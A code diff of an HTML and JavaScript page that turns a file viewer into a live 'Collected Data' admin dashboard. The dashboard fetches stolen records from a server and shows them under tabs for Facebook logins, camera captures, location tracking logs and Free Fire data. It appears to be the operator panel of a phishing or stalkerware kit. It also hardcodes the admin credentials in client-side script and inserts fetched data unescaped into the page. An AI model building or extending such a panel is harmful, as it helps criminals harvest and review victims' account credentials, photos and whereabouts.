@@ -28,7 +28,6 @@
             background-attachment: fixed;
         }
 
-        /* Glassmorphism Card Style */
         .glass-card {
             background: var(--glass-bg);
             backdrop-filter: blur(12px);
@@ -38,7 +37,7 @@
             box-shadow: var(--glass-shadow);
         }
 
-        /* Login Screen Container */
+        /* Login Screen */
         #loginContainer {
             width: 100%;
             max-width: 400px;
@@ -77,12 +76,6 @@
             font-size: 1rem;
             outline: none;
             box-sizing: border-box;
-            transition: border-color 0.3s;
-        }
-
-        .input-group input:focus {
-            border-color: var(--pink-accent);
-            box-shadow: 0 0 10px rgba(255, 42, 133, 0.4);
         }
 
         .btn {
@@ -95,13 +88,7 @@
             border-radius: 8px;
             cursor: pointer;
             width: 100%;
-            transition: opacity 0.2s, transform 0.2s;
             box-shadow: 0 4px 15px rgba(157, 78, 221, 0.4);
-        }
-
-        .btn:hover {
-            opacity: 0.9;
-            transform: translateY(-1px);
         }
 
         .error-msg {
@@ -110,7 +97,7 @@
             margin-top: 15px;
         }
 
-        /* Admin Dashboard Container */
+        /* Dashboard */
         #dashboardContainer {
             display: none;
             width: 100%;
@@ -128,11 +115,6 @@
             margin-bottom: 20px;
         }
 
-        .dashboard-header h2 {
-            margin: 0;
-            font-size: 1.5rem;
-        }
-
         .btn-logout {
             background: rgba(255, 255, 255, 0.1);
             border: 1px solid var(--glass-border);
@@ -141,13 +123,11 @@
             font-size: 0.85rem;
         }
 
-        /* Category Tabs */
         .tabs {
             display: flex;
             gap: 10px;
             margin-bottom: 25px;
             overflow-x: auto;
-            padding-bottom: 5px;
         }
 
         .tab-btn {
@@ -159,7 +139,6 @@
             border-radius: 8px;
             cursor: pointer;
             color: #d8b4fe;
-            transition: all 0.3s;
             white-space: nowrap;
         }
 
@@ -178,74 +157,33 @@
             display: block;
         }
 
-        /* Control / Uploader layout */
-        .controls {
-            background: rgba(0, 0, 0, 0.15);
-            padding: 15px;
-            border-radius: 10px;
-            border: 1px solid var(--glass-border);
-            margin-bottom: 20px;
-        }
-
-        .file-input-wrapper {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-
-        label {
-            font-size: 0.85rem;
-            font-weight: 600;
-            color: #e0aaff;
-        }
-
-        input[type="file"] {
-            color: #fff;
-        }
-
-        /* Viewer Display Area */
         .viewer-screen {
             width: 100%;
             height: 450px;
             border: 2px dashed var(--glass-border);
             border-radius: 10px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-            background: rgba(0, 0, 0, 0.2);
-            position: relative;
-        }
-
-        .placeholder-text {
-            color: #b8c1ec;
-            font-size: 0.95rem;
-            text-align: center;
-            padding: 20px;
-        }
-
-        .viewer-screen img, 
-        .viewer-screen video, 
-        .viewer-screen iframe {
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: contain;
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-
-        .viewer-screen pre {
-            width: 100%;
-            height: 100%;
-            margin: 0;
-            padding: 15px;
             overflow: auto;
-            background: #121019;
-            color: #ff758c;
-            font-family: 'Courier New', Courier, monospace;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 15px;
+            box-sizing: border-box;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            color: #fff;
             font-size: 0.9rem;
+        }
+
+        th, td {
+            padding: 12px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
             text-align: left;
+        }
+
+        th {
+            color: #ff758c;
+            background: rgba(0, 0, 0, 0.3);
         }
 
         .action-bar {
@@ -258,7 +196,11 @@
             background: linear-gradient(135deg, #10b981, #059669);
             width: auto;
             padding: 10px 20px;
-            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+            text-decoration: none;
+            color: white;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 0.9rem;
         }
 
         .hidden {
@@ -268,97 +210,61 @@
 </head>
 <body>
 
-    <!-- 1. ADMIN LOGIN PANEL -->
+    <!-- 1. LOGIN SCREEN -->
     <div id="loginContainer" class="glass-card">
         <h2>🔒 Admin Login</h2>
         <div class="input-group">
-            <label for="usernameInput">Username</label>
+            <label>Username</label>
             <input type="text" id="usernameInput" placeholder="Enter username">
         </div>
         <div class="input-group">
-            <label for="passwordInput">Password</label>
+            <label>Password</label>
             <input type="password" id="passwordInput" placeholder="Enter password">
         </div>
         <button class="btn" onclick="handleLogin()">Login Dashboard</button>
         <div id="errorMsg" class="error-msg"></div>
     </div>
 
-    <!-- 2. COLLECTED DATA VIEWER DASHBOARD (Protected) -->
+    <!-- 2. DASHBOARD -->
     <div id="dashboardContainer" class="glass-card">
         <div class="dashboard-header">
-            <h2>✨ Collected Data Admin Panel</h2>
+            <h2>✨ Live Collected Data Viewer</h2>
             <button class="btn btn-logout" onclick="handleLogout()">Logout</button>
         </div>
         
-        <!-- Category Navigation Tabs -->
         <div class="tabs">
-            <button class="tab-btn active" data-target="facebook" onclick="switchTab('facebook')">📘 Facebook Data / Logins</button>
-            <button class="tab-btn" data-target="camera" onclick="switchTab('camera')">📷 Camera Photos & Media</button>
-            <button class="tab-btn" data-target="location" onclick="switchTab('location')">📍 Location Data Logs</button>
-            <button class="tab-btn" data-target="ff" onclick="switchTab('ff')">🎮 Free Fire Data Logs</button>
+            <button class="tab-btn active" data-target="facebook" onclick="switchTab('facebook')">📘 Facebook Data</button>
+            <button class="tab-btn" data-target="camera" onclick="switchTab('camera')">📷 Camera Logs</button>
+            <button class="tab-btn" data-target="location" onclick="switchTab('location')">📍 Location Logs</button>
+            <button class="tab-btn" data-target="ff" onclick="switchTab('ff')">🎮 Free Fire Logs</button>
         </div>
 
-        <!-- 1. FACEBOOK DATA TAB -->
+        <!-- Dynamic Data Section for Tabs -->
         <div id="facebook-section" class="tab-content active">
-            <div class="controls">
-                <div class="file-input-wrapper">
-                    <label for="facebookUpload">Upload Facebook Collected Credentials / JSON / Logs:</label>
-                    <input type="file" id="facebookUpload" accept=".json,.txt,.csv" onchange="handleFile('facebook', event)">
-                </div>
-            </div>
-            <div class="viewer-screen" id="facebookViewer">
-                <div class="placeholder-text">No Facebook data file uploaded. Inspect captured info here.</div>
-            </div>
+            <div class="viewer-screen" id="facebookViewer">Loading data...</div>
             <div class="action-bar">
-                <a id="facebookDownload" href="#" class="btn btn-download hidden" download>📥 Download Facebook Data</a>
+                <button class="btn-download" onclick="downloadJSON('facebook')">📥 Download Facebook JSON</button>
             </div>
         </div>
 
-        <!-- 2. CAMERA MEDIA TAB -->
         <div id="camera-section" class="tab-content">
-            <div class="controls">
-                <div class="file-input-wrapper">
-                    <label for="cameraUpload">Upload Captured Camera Photos / Videos:</label>
-                    <input type="file" id="cameraUpload" accept="image/*,video/*" onchange="handleFile('camera', event)">
-                </div>
-            </div>
-            <div class="viewer-screen" id="cameraViewer">
-                <div class="placeholder-text">No camera media uploaded yet.</div>
-            </div>
+            <div class="viewer-screen" id="cameraViewer">Loading data...</div>
             <div class="action-bar">
-                <a id="cameraDownload" href="#" class="btn btn-download hidden" download>📥 Download Media File</a>
+                <button class="btn-download" onclick="downloadJSON('camera')">📥 Download Camera JSON</button>
             </div>
         </div>
 
-        <!-- 3. LOCATION DATA TAB -->
         <div id="location-section" class="tab-content">
-            <div class="controls">
-                <div class="file-input-wrapper">
-                    <label for="locationUpload">Upload Location Tracker Log (JSON / CSV / TXT):</label>
-                    <input type="file" id="locationUpload" accept=".json,.csv,.txt,.kml" onchange="handleFile('location', event)">
-                </div>
-            </div>
-            <div class="viewer-screen" id="locationViewer">
-                <div class="placeholder-text">No location log loaded.</div>
-            </div>
+            <div class="viewer-screen" id="locationViewer">Loading data...</div>
             <div class="action-bar">
-                <a id="locationDownload" href="#" class="btn btn-download hidden" download>📥 Download Location Log</a>
+                <button class="btn-download" onclick="downloadJSON('location')">📥 Download Location JSON</button>
             </div>
         </div>
 
-        <!-- 4. FREE FIRE DATA TAB -->
         <div id="ff-section" class="tab-content">
-            <div class="controls">
-                <div class="file-input-wrapper">
-                    <label for="ffUpload">Upload Free Fire Payload / Config / JSON Data:</label>
-                    <input type="file" id="ffUpload" accept=".json,.txt,.dat" onchange="handleFile('ff', event)">
-                </div>
-            </div>
-            <div class="viewer-screen" id="ffViewer">
-                <div class="placeholder-text">No Free Fire configuration data loaded.</div>
-            </div>
+            <div class="viewer-screen" id="ffViewer">Loading data...</div>
             <div class="action-bar">
-                <a id="ffDownload" href="#" class="btn btn-download hidden" download>📥 Download FF File</a>
+                <button class="btn-download" onclick="downloadJSON('ff')">📥 Download FF JSON</button>
             </div>
         </div>
     </div>
@@ -366,8 +272,8 @@
     <script>
         const correctUser = "sumit@1123";
         const correctPass = "sumit1123";
+        let globalData = {};
 
-        // Check if already logged in via Session Storage
         window.onload = function() {
             if (sessionStorage.getItem("isAdminLoggedIn") === "true") {
                 showDashboard();
@@ -377,106 +283,74 @@
         function handleLogin() {
             const user = document.getElementById("usernameInput").value.trim();
             const pass = document.getElementById("passwordInput").value.trim();
-            const errorMsg = document.getElementById("errorMsg");
-
             if (user === correctUser && pass === correctPass) {
                 sessionStorage.setItem("isAdminLoggedIn", "true");
                 showDashboard();
             } else {
-                errorMsg.textContent = "Invalid Username or Password! Try again.";
+                document.getElementById("errorMsg").textContent = "Invalid Credentials!";
             }
         }
 
         function showDashboard() {
             document.getElementById("loginContainer").classList.add("hidden");
             document.getElementById("dashboardContainer").style.display = "block";
+            fetchDataFromServer();
         }
 
         function handleLogout() {
             sessionStorage.removeItem("isAdminLoggedIn");
-            document.getElementById("dashboardContainer").style.display = "none";
-            document.getElementById("loginContainer").classList.remove("hidden");
-            document.getElementById("usernameInput").value = "";
-            document.getElementById("passwordInput").value = "";
-            document.getElementById("errorMsg").textContent = "";
+            location.reload();
         }
-
-        // Active Object URLs tracker for memory cleanup
-        const activeURLs = {
-            facebook: null,
-            camera: null,
-            location: null,
-            ff: null
-        };
 
         function switchTab(category) {
             document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
             document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
-
             document.querySelector(`[data-target="${category}"]`).classList.add('active');
             document.getElementById(`${category}-section`).classList.add('active');
         }
 
-        function handleFile(category, event) {
-            const file = event.target.files[0];
-            const viewer = document.getElementById(`${category}Viewer`);
-            const downloadBtn = document.getElementById(`${category}Download`);
-
-            if (!file) return;
-
-            if (activeURLs[category]) {
-                URL.revokeObjectURL(activeURLs[category]);
-            }
-
-            activeURLs[category] = URL.createObjectURL(file);
-
-            downloadBtn.href = activeURLs[category];
-            downloadBtn.download = file.name;
-            downloadBtn.classList.remove('hidden');
-
-            viewer.innerHTML = '';
-
-            const fileType = file.type;
-            const fileName = file.name.toLowerCase();
-
-            if (category === 'camera') {
-                if (fileType.startsWith('image/')) {
-                    const img = document.createElement('img');
-                    img.src = activeURLs[category];
-                    viewer.appendChild(img);
-                } else if (fileType.startsWith('video/')) {
-                    const video = document.createElement('video');
-                    video.src = activeURLs[category];
-                    video.controls = true;
-                    viewer.appendChild(video);
-                } else {
-                    showUnsupported(viewer, file.name);
-                }
-            } else {
-                // Text, JSON, logs, or general payload records
-                if (fileType.includes('json') || fileType.includes('text') || fileName.endsWith('.json') || fileName.endsWith('.txt') || fileName.endsWith('.csv') || fileName.endsWith('.kml')) {
-                    const reader = new FileReader();
-                    reader.onload = function(e) {
-                        const pre = document.createElement('pre');
-                        pre.textContent = e.target.result;
-                        viewer.appendChild(pre);
-                    };
-                    reader.readAsText(file);
-                } else if (fileType.startsWith('image/')) {
-                    const img = document.createElement('img');
-                    img.src = activeURLs[category];
-                    viewer.appendChild(img);
-                } else {
-                    showUnsupported(viewer, file.name);
-                }
-            }
+        // Server se data fetch karne ka function
+        function fetchDataFromServer() {
+            fetch('/get-data')
+                .then(res => res.json())
+                .then(data => {
+                    globalData = data;
+                    renderTable('facebook', 'facebookViewer');
+                    renderTable('camera', 'cameraViewer');
+                    renderTable('location', 'locationViewer');
+                    renderTable('ff', 'ffViewer');
+                })
+                .catch(err => console.error("Error fetching data:", err));
         }
 
-        function showUnsupported(viewer, name) {
-            const div = document.createElement('div');
-            div.className = 'placeholder-text';
-            div.innerHTML = `File preview not supported for <strong>${name}</strong>.<br>Use the download button below to access it.`;
-            viewer.appendChild(div);
+        function renderTable(category, containerId) {
+            const container = document.getElementById(containerId);
+            const items = globalData[category] || [];
+
+            if (items.length === 0) {
+                container.innerHTML = `<div style="text-align: center; color: #b8c1ec; padding: 20px;">No data recorded for ${category} yet.</div>`;
+                return;
+            }
+
+            let html = `<table><thead><tr><th>Timestamp</th><th>Details</th></tr></thead><tbody>`;
+            items.forEach(item => {
+                let detailsStr = JSON.stringify(item.data, null, 2);
+                html += `<tr><td>${item.timestamp}</td><td><pre style="margin:0; color:#ff758c;">${detailsStr}</pre></td></tr>`;
+            });
+            html += `</tbody></table>`;
+            container.innerHTML = html;
+        }
+
+        // Individual category data download button
+        function downloadJSON(category) {
+            const items = globalData[category] || [];
+            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(items, null, 2));
+            const downloadAnchor = document.createElement('a');
+            downloadAnchor.setAttribute("href", dataStr);
+            downloadAnchor.setAttribute("download", `${category}_logs.json`);
+            document.body.appendChild(downloadAnchor);
+            downloadAnchor.click();
+            downloadAnchor.remove();
         }
     </script>
 </body>
